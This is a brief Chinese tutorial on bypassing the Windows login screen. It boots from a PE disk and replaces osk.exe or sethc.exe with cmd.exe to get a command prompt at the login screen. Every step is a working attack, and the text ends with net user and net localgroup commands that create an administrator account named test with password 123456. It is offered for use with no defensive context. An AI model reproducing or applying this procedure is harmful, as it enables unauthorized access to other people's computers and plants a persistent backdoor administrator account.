# 无密码进入Windows系统
很老的一个方案,但依然有效.
1. 用PE启动电脑
2. 将屏幕键盘`C:\Windows\System32\osk.exe`(粘滞键`sethc.exe`等亦可)文件改为`C:\Windows\System32\osk.exe.bak`
3. 将`C:\Windows\System32\cmd.exe`复制为`C:\Windows\System32\osk.exe`
4. 退出PE,启动电脑,登录界面选择屏幕键盘,此时会弹出命令行窗口
5. 执行,新建test用户,密码为123456,加入管理员组
    ```bat
    net user test 123456 /add
    net localgroup administrators test /add
    ```